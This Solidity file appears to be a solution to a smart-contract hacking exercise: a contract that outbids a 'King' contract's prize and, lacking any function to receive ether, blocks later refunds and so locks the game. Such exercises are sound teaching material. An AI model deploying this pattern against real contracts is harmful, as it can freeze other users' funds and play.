// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external returns (bool) {
        uint256 currentPrize = King(contractAddress).prize();
        (bool success, ) = contractAddress.call{value: currentPrize + 1 ether }("");

        return success;
    }
}
